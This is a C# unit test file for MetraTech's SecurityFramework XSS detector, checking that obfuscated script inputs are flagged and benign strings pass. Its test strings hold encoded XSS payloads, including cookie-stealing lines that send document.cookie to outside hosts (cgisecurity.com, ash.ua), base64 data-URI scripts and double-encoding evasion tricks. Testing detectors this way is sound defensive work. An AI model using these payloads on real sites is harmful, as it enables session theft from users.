using System;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using MetraTech.SecurityFramework;
using MetraTech.SecurityFramework.Core.Common;
using MetraTech.SecurityFramework.Core.Detector;
using Microsoft.VisualStudio.TestTools.UnitTesting;

namespace MetraTech.SecurityFrameworkUnitTests.Processor
{
    [TestClass]
    public class ProcessorXssDetectorTest
    {
        private TestContext testContextInstance;

        /// <summary>
        ///Gets or sets the test context which provides
        ///information about and functionality for the current test run.
        ///</summary>
        public TestContext TestContext
        {
            get
            {
                return testContextInstance;
            }
            set
            {
                testContextInstance = value;
            }
        }

        #region Additional test attributes
        //
        // You can use the following additional attributes as you write your tests:
        //
        // Use ClassInitialize to run code before running the first test in the class
        [ClassInitialize()]
        public static void SecurityKernelInitialize(TestContext testContext)
        {
            UnitTestUtility.InitFrameworkConfiguration(testContext);
        }

        // Use ClassCleanup to run code after all tests in a class have run
        [ClassCleanup()]
        public static void SecurityKernelClassCleanup()
        {
            UnitTestUtility.CleanupFrameworkConfiguration();
        }
        //
        // Use TestInitialize to run code before running each test 
        [TestInitialize()]
        public void SecurityKernelAllTetsInitialize()
        {
            Assert.IsTrue(SecurityKernel.IsInitialized(), "SecurityKernel is not Initialized.");
        }
        //
        // Use TestCleanup to run code after each test has run
        // [TestCleanup()]
        // public void MyTestCleanup() { }
        //
        #endregion

        #region *** First Rule ***

        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectUnicode()
        {
            string inputStr = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#1055;&#1088;&#1080;&#1074;&#1077;&#1090;&#39;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectUnicode2()
        {
            string inputStr = "&#x60;&#x115;&#x99;&#x60;&#x115;&#x99;&#x60;&#x115;&#x99;&#x99;";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectUnicode3()
        {
            string inputStr = @"\x60\x11\x99\x60\x15\x99\x60\x15\x99\x60";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectUnicode4()
        {
            string inputStr = "\\u0060\\u0115\\u0099\\u1014\\u0105\\u0112\\u1160\\u0062\\u0116\\u0062";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }
        
		//[TestMethod]
		//[ExpectedException(typeof(ProcessorException))]
		//public void ProcessorTest_DetectUnicode5()
		//{
		//    string inputStr = @"0x60;0x115;0x99;0x60;0x115;0x99;0x60;0x115;0x99;0x60;";
		//    GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
		//}

		//[TestMethod]
		//[ExpectedException(typeof(ProcessorException))]
		//public void ProcessorTest_DetectUnicode6()
		//{
		//    string inputStr = @"#60;#115;#99;#60;#115;#99;#60;#115;#99;#60;";
		//    GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
		//}

        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectUnicode7()
        {
            string inputStr = "\\u0060\\u0115\\u0099\\u0114\\u0105\\u0112\\u0116\\u0062\\u0116\\u0062";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        public void ProcessorTest_DetectUnicode_Negative()
        {
            string inputStr = "&60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#1055;&#1088;&#1080;&#1074;&#1077;&#1090;&#39;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        #endregion *** First Rule ***

        #region *** Second Rule ***

        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectBase64()
        {
            string inputStr = "TWFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5vdCBvbmx5IGJ5IGhpcyByZWFzb24sIGJ1dCBieSB0aGlzIHNpbmd1bGFyIHBhc3Npb24gZnJvbSBvdGhlciBhbmltYWxzLCB3aGljaCBpcyBhIGx1c3Qgb2YgdGhlIG1pbmQsIHRoYXQgYnkgYSBwZXJzZXZlcmFuY2Ugb2YgZGVsaWdodCBpbiB0aGUgY29udGludWVkIGFuZCBpbmRlZmF0aWdhYmxlIGdlbmVyYXRpb24gb2Yga25vd2xlZGdlLCBleGNlZWRzIHRoZSBzaG9ydCB2ZWhlbWVuY2Ugb2YgYW55IGNhcm5hbCBwbGVhc3VyZS4K";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        [TestMethod]
        public void ProcessorTest_DetectBase64_Negative1()
        {
            // length of input string is 16
            string inputStr = "TWFuIGlzIGRpc3Rp";
            GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.General);
        }

        [TestMethod]
        public void ProcessorTest_DetectBase64_Negative2()
        {
            string inputStr = "T WFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5";
            GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.General);
        }

        [TestMethod]
        public void ProcessorTest_DetectBase64_Negative3()
        {
            string inputStr = " WFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5 ";
            GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.General);
        }

        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectBase64_Cycle()
        {
            string inputStr = @"%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e
%6c%6f%63%61%74%69%6f%6e%3d%27 %68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69 %2d%62%69%6e%2f
%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f %6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e";
            GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.DetectHtmlTag);
        }

        /// <summary>
        /// There are used three additional symbols+, _, -. Noone known standart allows this BASE64 
        /// </summary>
        [TestMethod]
        public void ProcessorTest_DetectBase64_Negative4()
        {
            string inputStr = "LLrHB0eJzyhP+_fSStdW8okeEnv47jxe7SJ_iN72ohNcUk2jHEUSoH1nvNSIWL9M8tEjmF_zxB-bATMtPjCUWbz8Lr9wloXIkjHUlBLpvXR0UrUzYbkNpk0agV2IzUpkJ6UiRRGcDSvzrsoK+oNvqu6z7Xs5Xfz5rDqUcMlK1Z6720dcBWGGsDLpTpSCnpotdXd_H5LMDWnonNvPCwQUHtDD";
            GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.General);
        }

        /// <summary>
        /// There are used three additional symbols+, _, -. Noone known standart allows this BASE64 
        /// </summary>
        [TestMethod]
        public void ProcessorTest_DetectBase64_Negative5()
        {
            string inputStr = "Its my_favorite_catalog_for_interesting_messages";
            GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.General);
        }

        #endregion *** Second Rule ***

        #region *** Thrid Rule ***
        
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DetectSimpleXss()
        {
            string inputStr = "alert('XSS')";
            GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectDomElement);
        }

        [TestMethod]
        public void ProcessorTest_DetectSimpleXss_Negative()
        {
            string inputStr = "alert2('XSS')";
            GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.DetectDomElement);
        }

        #endregion *** Thrid Rule ***

        #region *** Fourth Rule ***

        /// <summary>
        /// Html decoding
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_HtmDecoding()
        {
            string inputStr = "&lt;script&gt; ttt &lt;/script&gt;";
            string expectedResult = "<script> ttt </script>";
            string actualResult = GeneralXssDetectonTest(inputStr, 7, ExceptionId.Detector.DetectHtmlTag);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
            Assert.IsTrue(expectedResult == actualResult);
        }

        /// <summary>
        /// Html decoding
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_HtmDecoding2()
        {
            string inputStr = "&lt;script&gt; ttt &lt;script&gt;";
            string expectedResult = "<script> ttt <script>";
            string actualResult = GeneralXssDetectonTest(inputStr, 7, ExceptionId.Detector.DetectHtmlTag);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
            Assert.IsTrue(expectedResult == actualResult);
        }

        /// <summary>
        /// Some info from http://ha.ckers.org/xss.html: 
        ///Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for "&#XX;", 
        /// since most people don't know about padding - up to 7 numeric characters total). 
        /// This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/;
        /// which incorrectly assumes a semicolon is required to terminate a html encoded string. 
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_HtmlDecoding3()
        {
            // after decoding: "javascript:alert('XSS')"
            string inputStr = "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        /// <summary>
        /// Html decoding. XSS detector should encode entity escaping: &lt&gt without ;
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_HtmDecoding4()
        {
            string inputStr = "&ltscript&gt ttt &ltscript&gt";
            string expectedResult = "<script> ttt <script>";
            string actualResult = GeneralXssDetectonTest(inputStr, 7, ExceptionId.Detector.DetectHtmlTag);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
            Assert.IsTrue(expectedResult == actualResult);
        }

        /// <summary>
        /// JavaScript decoding
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_JavaScriptDecoding()
        {
            string inputStr = "+XSS\x20\u043F\u0440\u0438\u0432\u0435\u0442/.\x20\x3Cscript+\x20\x3E";
            string expectedResult = "+XSS привет/. <script+ >";
            string actualResult = GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectHtmlTag);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
            Assert.IsTrue(expectedResult == actualResult);
        }

        /// <summary>
        /// JavaScript decoding (octal code)
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_JavaScriptOctalCodeDecoding()
        {
            string inputStr = @"\74scrip\164\76";
            string expectedResult = "<script>";
            string actualResult = GeneralXssDetectonTest(inputStr, 10, ExceptionId.Detector.DetectHtmlTag);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
            Assert.IsTrue(expectedResult == actualResult);
        }

        /// <summary>
        /// Url decoding
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_UrlDecoding()
        {
            // Hex coded "><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?' +document.cookie</script>
            string inputStr =
                "%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e";
            GeneralXssDetectonTest(inputStr, 3, ExceptionId.Detector.DetectObfuscation);
        }

        /// <summary>
        /// Url decoding
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_UrlDecoding2()
        {
            string inputStr = "%2BXSS+%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82%2F.+%3Cscript%2B+%3E";
            string expectedResult = "+XSS привет/. <script+ >";
            string actualResult = GeneralXssDetectonTest(inputStr, 9, ExceptionId.Detector.DetectHtmlTag);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
            Assert.IsTrue(expectedResult == actualResult);
        }

        /// <summary>
        /// Url decoding
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_UrlDecoding3()
        {
            string inputStr = "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E";
            string expectedResult = "+XSS привет/. <script+ >";
            string actualResult = GeneralXssDetectonTest(inputStr, 14, ExceptionId.Detector.DetectDomElement);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
            Assert.IsTrue(expectedResult == actualResult);
        }

        #region Pyton test BUG-180: XSS: VB Script code is not detected

        /// <summary>
        /// VBScript id=58
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_VBScriptXssDetector1()
        {
            string inputStr = "Function CanDeliver(Dt) CanDeliver = (CDate(Dt) - Now()) > 2 End Function";
            string actualResult = GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectVbScriptElement);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", inputStr, actualResult));
            
        }

        /// <summary>
        /// VBScript id=59
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_VBScriptXssDetector2()
        {
            string inputStr = "GetObject(t)";
            string actualResult = GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectVbScriptElement);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", inputStr, actualResult));

        }

        /// <summary>
        /// VBScript id=61
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_VBScriptXssDetector3()
        {
            string inputStr = "ScriptEngine(t)";
            string actualResult = GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectVbScriptElement);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", inputStr, actualResult));

        }

        /// <summary>
        /// VBScript id=62
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_VBScriptXssDetector4()
        {
            string inputStr = "TypeName(t)";
            string actualResult = GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectVbScriptElement);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", inputStr, actualResult));

        }

        /// <summary>
        /// VBScript id=63
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_VBScriptXssDetector5()
        {
            string inputStr = "VarType(t)";
            string actualResult = GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectVbScriptElement);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", inputStr, actualResult));

        }

        #endregion Pyton test BUG-180: XSS: VB Script code is not detected

        #endregion *** Fourth Rule ***

        ///// <summary>
        ///// LDAP decoding
        ///// </summary>
        //[TestMethod]
        //[ExpectedException(typeof(ProcessorException))]
        //public void LdapDecodingTest()
        //{
        //    string inputStr = "\\3cscript\\3ealert\\28\\27XSS\\27\\29\\3c\\2fscript\\3e";
        //    string expectedResult = "<script>alert('XSS')</script>";
        //    string actualResult = GeneralXssDetectonTest(inputStr, 10, ExceptionId.Detector.DetectDomElement);
        //    Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
        //}

        ///// <summary>
        ///// CSS decoding
        ///// </summary>
        //[TestMethod]
        //[ExpectedException(typeof(ProcessorException))]
        //public void ProcessorTest_CssDecoding()
        //{
        //    string inputStr = "\\3c script\\3e alert\\28 \\27 XSS\\27 \\29 \\3c \\2f script\\3e ";
        //    string expectedResult = "<script>alert('XSS')</script>";
        //    string actualResult = GeneralXssDetectonTest(inputStr, 17, ExceptionId.Detector.DetectDomElement);
        //    Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
        //}

        /// <summary>
        /// VbScript decoding
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_VbScriptDecoding()
        {
            string inputStr = "chrw(60)&\"script\"&chrw(62)&\"alert\"&chrw(40)&chrw(34)&\"XSS\"&chrw(34)&chrw(41)&chrw(60)&chrw(47)&\"script\"&chrw(62)";
            string expectedResult = "<script>alert('XSS')</script>";
            string actualResult = GeneralXssDetectonTest(inputStr, 12, ExceptionId.Detector.DetectDomElement);
            Console.WriteLine(String.Format("Expected result = '{0}' and Actual result = '{1}'", expectedResult, actualResult));
        }

        #region *** Pyton test ***
        //TODO: Must check this test. Output value is: %<%s%c%r%i%p%t%>%a%l%e%r%t%(%d%o%c%u%m%e%n%t%.%c%o%o%k%i%e%)%<%/%s%c%r%i%p%t%>
        /// <summary>
        ///  Pyton test id=133: Double encoded code Javascript HTML
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DoubleEncode()
        {
            // decoded input data %<%s%c%r%i%p%t%>%a%l%e%r%t%(%d%o%c%u%m%e%n%t%.%c%o%o%k%i%e%)%<%/%s%c%r%i%p%t%>
            string inputStr = "&percnt;%u003c&percnt;%u0073&percnt;%u0063&percnt;%u0072&percnt;%u0069&percnt;%u0070&percnt;%u0074&percnt;%u003e&percnt;%u0061&percnt;%u006c&percnt;%u0065&percnt;%u0072&percnt;%u0074&percnt;%u0028&percnt;%u0064&percnt;%u006f&percnt;%u0063&percnt;%u0075&percnt;%u006d&percnt;%u0065&percnt;%u006e&percnt;%u0074&percnt;%u002e&percnt;%u0063&percnt;%u006f&percnt;%u006f&percnt;%u006b&percnt;%u0069&percnt;%u0065&percnt;%u0029&percnt;%u003c&percnt;%u002f&percnt;%u0073&percnt;%u0063&percnt;%u0072&percnt;%u0069&percnt;%u0070&percnt;%u0074&percnt;%u003e";
            string actualResult = String.Empty;
			try
			{
				actualResult = GeneralXssDetectonTest(inputStr, 12, ExceptionId.Detector.DetectHtmlTag);
			}
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }

        /// <summary>
        ///  Pyton test id=135: Double encoded code HTML*2
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DoubleEncodeHtml()
        {
            // decoded input data <script>alert(document.cookie)</script>
            string inputStr = "&amp;lt;script&amp;gt;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&amp;lt;&amp;sol;script&amp;gt;";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 10, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }

        /// <summary>
        ///  Pyton test id=137: Double encoded code URL HTML 
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DoubleEncodeUrlHtml()
        {
            // decoded input data: <script>alert(document.cookie&rp;ar;</script>
            string inputStr = "&percnt;3cscript&percnt;3ealert&lpar;document&period;cookie&rp;ar;&percnt;3c&sol;script&percnt;3e";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 7, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }

        /// <summary>
        ///  Pyton test id: 150: Cycles 5 html 
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_Cycles5Html()
        {
            // decoded input data: <script>alert(document.cookie)</script>
            string inputStr =  "&ampampampampltscript&ampampampampgtalert&ampampampamplpardocument&ampampampampperiodcookie&ampampampamprpar&ampampampamplt&ampampampampsolscript&ampampampampgt";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 19, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }

        //TODO: In Bug-184 - this iput data describes as XSS attack
        /// <summary>
        ///  Pyton test id: 151: Cycles 5 html +2 Java script 
        /// </summary>
        [TestMethod]
        public void ProcessorTest_Cycles5Html2Java_Negative()
        {
            // cycle decoded input data: &&am
            string inputStr = "&%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 29, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
            
        }

        /// <summary>
        ///  Pyton test id: 153: Cycles 
        /// </summary>
        [TestMethod]
        public void ProcessorTest_Cycles_Negative()
        {
            // cycle decoded input data:  $%2
            string inputStr = "&percntu0024&percntu0025&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 67, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }

        /// <summary>
        ///  Pyton test id: 76: Checking for posibility of Xss injection attacks 
        /// </summary>
        /// <remarks>Bug-183</remarks>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_DocumentCookieXssAttack()
        {
            string inputStr = "img=new Image(); img.src=\"http://ash.ua/image.gif?\"+document.cookie;";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 4, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }

        /// <summary>
        ///  Pyton test id: 78: real attacks with base64 coding is not detected
        /// </summary>
        /// <remarks>Bug-182</remarks>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_Base64RealXssAttack()
        {
            // input string is data:text/html<script>alert(document.cookie)</script>
            string inputStr = "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 7, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }
        #endregion *** Pyton test ***

        /// <summary>
        /// XSS attack from Cross_Site_Scripting_Attacks_and_Defense.pdf book, page 59
        /// </summary>
        [TestMethod]
        [ExpectedException(typeof(ProcessorException))]
        public void ProcessorTest_UrlandBase64RealXssAttack()
        {
            // input string is http://example.com/mail?redirect-after-login=data:text/html<script>alert('XSS');</script>
            string inputStr = "http://example.com/mail?redirect-after-login=data%3Atext/html%3Bbase64%2CPHNjcmlwdD4KYWxlcnQoJ1hTUycpOwo8L3NjcmlwdD4%3D";
            string actualResult = String.Empty;
            try
            {
                actualResult = GeneralXssDetectonTest(inputStr, 12, ExceptionId.Detector.DetectDomElement);
            }
            finally
            {
                Console.WriteLine("Input string: " + inputStr);
                Console.WriteLine("Input string after XSS detections: " + actualResult);
            }
        }

        private string GeneralXssDetectonTest(string inputStr, int countWorkedRules, ExceptionId.Detector problemIdForLastException)
        {
            string result = String.Empty;
            string categoryName = Convert.ToString(ProcessorEngineCategory.Xss);

            ProcessorEngine processorEngine = (ProcessorEngine)SecurityKernel.Processor.Api.GetDefaultEngine(categoryName);
            try
            {
                result = processorEngine.Execute(inputStr);
            }
            catch (ProcessorException ex)
            {
                Console.WriteLine(String.Format("ProccesorException was found: Id={0}; Message='{1}'", ex.Id, ex.Message));
                Console.WriteLine(EndExceptionStr);
                WriteExceptionsToConsole(ex.Errors);
                
                BadInputDataException badInputDataException = ex.Errors.Last() as BadInputDataException;
                Assert.IsFalse(badInputDataException == null,
                               String.Format("First exception for XSS detector rule should be {0}"
                                             , typeof(BadInputDataException).Name));
                Assert.IsFalse(badInputDataException.Id != problemIdForLastException.ToInt()
                                 , String.Format("Last exception for XSS detector rule should be contain Problem Id = {0}. Expected is = {1}"
                                                  , problemIdForLastException
                                                  , ((ExceptionId.Detector)badInputDataException.Id)));
                throw;
            }
            finally
            {
                if (processorEngine != null)
                {
					Console.WriteLine("=========================================");
                    string msg = "Worked rules:\n";
                    int index = 1;
					foreach (string workedIdEngine in processorEngine.ChainRules)
                    {
                        msg += String.Format("{0}) {1}; \n", index++, workedIdEngine);
                    }
                    Console.WriteLine(msg);
                    Console.WriteLine("=========================================");
                    Assert.IsFalse(countWorkedRules != processorEngine.ChainRules.Count
                                   , String.Format("Count worked rules should be {0}, but actual worked {1}"
                                                   , countWorkedRules
                                                   , processorEngine.ChainRules.Count));
                }
            }

            return result;
        }

        const string EndExceptionStr = "------------------------------------";
        public static void WriteExceptionsToConsole(IEnumerable<Exception> ex)
        {
            foreach (Exception exception in ex)
            {
                BadInputDataException badInputDataException = exception as BadInputDataException;
                if (badInputDataException != null)
                {
                    Console.WriteLine(String.Format("1. Type is = '{0}'", exception.GetType().Name));
                    Console.WriteLine(String.Format("2. Problem Id = '{0}'", badInputDataException.Id));
                    Console.WriteLine(String.Format("3. Subsystem = '{0}'", badInputDataException.SubsystemName));
                    Console.WriteLine(String.Format("4. Category= '{0}'", badInputDataException.CategoryName));
                    Console.WriteLine(String.Format("5. Message (User will see this text)  = '{0}'", badInputDataException.Message));
                    Console.WriteLine(String.Format("6. Input data = '{0}'", badInputDataException.InputData));
                    Console.WriteLine(String.Format("7. Reason = '{0}'", badInputDataException.Reason));
                    Console.WriteLine(String.Format("8. Event Type = '{0}'", badInputDataException.EventType));
                    Console.WriteLine(EndExceptionStr);

                }
                else
                {
                    Console.WriteLine(String.Format("1. Type is = '{0}'", exception.GetType().Name));
                    Console.WriteLine(String.Format("5. Message (User will see this text)  = '{0}'", exception.Message));
                    Console.WriteLine(EndExceptionStr);
                }
            }
        }
    }
}
